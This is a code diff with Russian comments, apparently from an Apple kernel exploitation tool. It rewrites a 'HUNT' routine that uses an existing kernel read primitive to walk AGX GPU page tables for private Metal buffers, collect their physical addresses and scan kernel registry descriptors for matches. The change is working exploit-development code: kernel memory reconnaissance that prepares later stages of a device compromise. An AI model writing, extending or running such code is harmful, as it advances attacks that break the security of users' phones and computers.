@@ -5362,23 +5362,44 @@ static BOOL kpHuntPtrOK(uint64_t v)
     GNOTE( [NSString stringWithFormat:@"  цепь: uc=%#llx accel=%#llx gart=%#llx uat=%#llx mapper=%#llx L1arr=%#llx",
                agxuc, accel, gart, uat, mapper, L1arr]);
 
-    // 3. HUNT v3: private-буферы. Для storageModeShared heap-дескриптор
-    //    phys НЕ хранит (калибровка 1.9.61: ranges дескриптора = {phys=0,
-    //    len=0x4000} — shared мапится через user pmap). Private — драйвер
-    //    выделяет страницы сам, и phys реально лежит в ranges. Два буфера
-    //    разного размера: A без submit (0x40000) и B с принудительным
-    //    compute-submit (0x44000). Матч по сумме len в ranges отвечает на
-    //    вопрос: ranges заполняются при создании или при первом submit'е.
+    // 3. HUNT v4: обратный ход. Registry-walk v3 дал 0/1024 — private
+    //    буферы там не живут (или в другой форме). Но GPU VA буферов известны
+    //    (gpuAddress), а GPU-таблицы мы ЧИТАТЬ умеем (0x17 read ok, проверено
+    //    recon'ом). Walk по gpuAddress даёт PTE → реальный phys страниц
+    //    буфера → этими значениями ищем дескриптор. Плюс ответ: map при
+    //    создании (A, без submit) или при submit (B).
 
     // 3a. буферы
     id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
     id<MTLBuffer> bufA = mtl ? [mtl newBufferWithLength:0x40000 options:MTLResourceStorageModePrivate] : nil;
     id<MTLBuffer> bufB = mtl ? [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate] : nil;
     if (!bufA || !bufB) { GNOTE( @"FAIL: private buffers"); gGartLive = NO; return r; }
-    GNOTE( [NSString stringWithFormat:@"  priv A: gpuAddr=%#llx len=0x40000 (без submit)", (uint64_t)bufA.gpuAddress]);
-    GNOTE( [NSString stringWithFormat:@"  priv B: gpuAddr=%#llx len=0x44000 (submit ниже)", (uint64_t)bufB.gpuAddress]);
+    uint64_t gvaA = (uint64_t)bufA.gpuAddress;
+    uint64_t gvaB = (uint64_t)bufB.gpuAddress;
+    GNOTE( [NSString stringWithFormat:@"  priv A: gpuAddr=%#llx (без submit) · priv B: gpuAddr=%#llx", gvaA, gvaB]);
 
-    // 3b. принудительный map для B: крошечный compute, пишущий в B
+    uint64_t needles[16]; int nneedles = 0;
+
+    // 3b. walk A ДО submit
+    {
+        uint64_t pc = (gvaA >> 36) & 0x7FF, pd = (gvaA >> 25) & 0x7FF, pt = (gvaA >> 14) & 0x7FF;
+        uint64_t e1 = kp_rc_kread64(L1arr + pc * 8);
+        uint64_t L2 = (e1 & 1) ? gPrimitives.phystokv(e1 & 0xFFFFFFFFF000ULL) : 0;
+        uint64_t e2 = L2 ? kp_rc_kread64(L2 + pd * 8) : 0;
+        uint64_t L3 = (e2 & 1) ? gPrimitives.phystokv(e2 & 0xFFFFFFFFF000ULL) : 0;
+        GNOTE( [NSString stringWithFormat:@"  walk A(pre): pc=%llu pd=%llu pt=%llu e1=%#llx e2=%#llx L3=%#llx",
+                   (unsigned long long)pc, (unsigned long long)pd, (unsigned long long)pt, e1, e2, L3]);
+        if (L3) {
+            for (int i = 0; i < 4; i++) {
+                uint64_t pte = kp_rc_kread64(L3 + (pt + i) * 8);
+                uint64_t ph = pte & 0xFFFFFFFFF000ULL;
+                GNOTE( [NSString stringWithFormat:@"    A PTE[%d]=%#llx → phys=%#llx%@", i, pte, ph, (pte & 1) ? @"" : @" (invalid)"]);
+                if ((pte & 1) && ph && nneedles < 16) needles[nneedles++] = ph;
+            }
+        }
+    }
+
+    // 3c. принудительный map для B: крошечный compute, пишущий в B
     @autoreleasepool {
         NSError *err = nil;
         id<MTLLibrary> lib = [mtl newLibraryWithSource:@"kernel void wf(device ulong *o [[buffer(0)]]) { o[0] = 0x4242424242424242; }" options:nil error:&err];
@@ -5398,7 +5419,29 @@ static BOOL kpHuntPtrOK(uint64_t v)
         } else GNOTE( [NSString stringWithFormat:@"  submit B: оборвался: %@", err]);
     }
 
-    // 3c. registry коннекта
+    // 3d. walk B (после submit) + повторный walk A
+    for (int pass = 0; pass < 2; pass++) {
+        uint64_t gva = pass ? gvaA : gvaB;
+        const char *tag = pass ? "A(post)" : "B(post)";
+        uint64_t pc = (gva >> 36) & 0x7FF, pd = (gva >> 25) & 0x7FF, pt = (gva >> 14) & 0x7FF;
+        uint64_t e1 = kp_rc_kread64(L1arr + pc * 8);
+        uint64_t L2 = (e1 & 1) ? gPrimitives.phystokv(e1 & 0xFFFFFFFFF000ULL) : 0;
+        uint64_t e2 = L2 ? kp_rc_kread64(L2 + pd * 8) : 0;
+        uint64_t L3 = (e2 & 1) ? gPrimitives.phystokv(e2 & 0xFFFFFFFFF000ULL) : 0;
+        GNOTE( [NSString stringWithFormat:@"  walk %s: pc=%llu pd=%llu pt=%llu e1=%#llx e2=%#llx L3=%#llx",
+                   tag, (unsigned long long)pc, (unsigned long long)pd, (unsigned long long)pt, e1, e2, L3]);
+        if (L3) {
+            for (int i = 0; i < 4; i++) {
+                uint64_t pte = kp_rc_kread64(L3 + (pt + i) * 8);
+                uint64_t ph = pte & 0xFFFFFFFFF000ULL;
+                GNOTE( [NSString stringWithFormat:@"    %s PTE[%d]=%#llx → phys=%#llx%@", tag, i, pte, ph, (pte & 1) ? @"" : @" (invalid)"]);
+                if ((pte & 1) && ph && nneedles < 16) needles[nneedles++] = ph;
+            }
+        }
+    }
+    GNOTE( [NSString stringWithFormat:@"  needles (phys из PTE): %d", nneedles]);
+
+    // 3e. registry: дамп nonzero слотов + охота по needles.
     uint64_t shared = kp_rc_kread64(agxuc + 0x120);
     uint64_t registry = kpHuntPtrOK(shared) ? kp_untag_ptr(kp_rc_kread64(kp_untag_ptr(shared) + 0x88)) : 0;
     GNOTE( [NSString stringWithFormat:@"  shared=%#llx registry=%#llx", shared, registry]);
@@ -5409,17 +5452,28 @@ static BOOL kpHuntPtrOK(uint64_t v)
     GNOTE( [NSString stringWithFormat:@"  registry: array=%#llx count=%llu", rarray, rcount]);
     if (!kpHuntPtrOK(rarray) || !rcount || rcount > 8192) { GNOTE( @"FAIL: registry array/count"); gGartLive = NO; return r; }
 
-    // 3d. перебор id: entry → кандидаты → desc+0x90 → sub+0x10 → ranges;
-    //     сумма lens (до 32 пар, стоп на len==0). Матч 0x40000=A / 0x44000=B.
-    int found = 0, land = 0;
+    int nz = 0, found = 0;
     for (uint64_t rid = 0; rid < rcount; rid++) {
-        uint64_t entry = kp_rc_kread64(rarray + rid * 8);
-        if (!kpHuntPtrOK(entry)) continue;
-        entry = kp_untag_ptr(entry);
+        uint64_t slot = kp_rc_kread64(rarray + rid * 8);
+        if (!slot) continue;
+        nz++;
+        if (nz <= 16) GNOTE( [NSString stringWithFormat:@"  slot[%llu] = %#llx", rid, slot]);
+        for (int ni = 0; ni < nneedles; ni++)
+            if ((slot & ~0xFFFULL) == needles[ni]) {
+                GNOTE( [NSString stringWithFormat:@"★ slot[%llu] == phys needle %#llx", rid, needles[ni]]);
+                found++;
+            }
+        if (!kpHuntPtrOK(slot)) continue;
+        uint64_t entry = kp_untag_ptr(slot);
         uint64_t cands[33]; int nc = 0;
         cands[nc++] = entry;
         for (uint64_t off = 8; off < 0x100 && nc < 33; off += 8) {
             uint64_t v = kp_rc_kread64(entry + off);
+            for (int ni = 0; ni < nneedles; ni++)
+                if ((v & ~0xFFFULL) == needles[ni]) {
+                    GNOTE( [NSString stringWithFormat:@"★ id=%llu entry+%#llx == phys needle %#llx", rid, off, needles[ni]]);
+                    found++;
+                }
             if (kpHuntPtrOK(v)) cands[nc++] = kp_untag_ptr(v);
         }
         for (int ci = 0; ci < nc; ci++) {
@@ -5430,29 +5484,20 @@ static BOOL kpHuntPtrOK(uint64_t v)
             uint64_t arr = kp_rc_kread64(sub + 0x10);
             if (!kpHuntPtrOK(arr)) continue;
             arr = kp_untag_ptr(arr);
-            uint64_t sum = 0, fp = 0, fl = 0; int np = 0;
             for (int pi = 0; pi < 32; pi++) {
                 uint64_t p = kp_rc_kread64(arr + (uint64_t)pi * 16);
                 uint64_t l = kp_rc_kread64(arr + (uint64_t)pi * 16 + 8);
                 if (!l) break;
-                if (!pi) { fp = p; fl = l; }
-                sum += l; np++;
-            }
-            if (!np) continue;
-            if (sum == 0x40000 || sum == 0x44000) {
-                GNOTE( [NSString stringWithFormat:@"★ КАНДИДАТ %@: id=%llu entry=%#llx desc=%#llx sub=%#llx ranges=%#llx",
-                           sum == 0x40000 ? @"A (без submit)" : @"B (после submit)", rid, entry, desc, sub, arr]);
-                for (int pi = 0; pi < np && pi < 8; pi++)
-                    GNOTE( [NSString stringWithFormat:@"    ranges[%d] = {phys=%#llx len=%#llx}", pi,
-                               kp_rc_kread64(arr + (uint64_t)pi * 16), kp_rc_kread64(arr + (uint64_t)pi * 16 + 8)]);
-                found++;
-            } else if (land < 16) {
-                GNOTE( [NSString stringWithFormat:@"  land: id=%llu desc=%#llx pairs=%d sum=%#llx [0]={%#llx,%#llx}", rid, desc, np, sum, fp, fl]);
-                land++;
+                for (int ni = 0; ni < nneedles; ni++)
+                    if ((p & ~0xFFFULL) == needles[ni]) {
+                        GNOTE( [NSString stringWithFormat:@"★★ ДЕСКРИПТОР: id=%llu entry=%#llx desc=%#llx sub=%#llx ranges=%#llx ranges[%d]={phys=%#llx len=%#llx}",
+                                   rid, entry, desc, sub, arr, pi, p, l]);
+                        found++;
+                    }
             }
         }
     }
-    GNOTE( [NSString stringWithFormat:@"  hunt: ids=%llu desc-матчей=%d landscape=%d", rcount, found, land]);
+    GNOTE( [NSString stringWithFormat:@"  hunt: ids=%llu nonzero=%d needle-матчей=%d", rcount, nz, found]);
     gGartLive = NO;
     return r;
 }
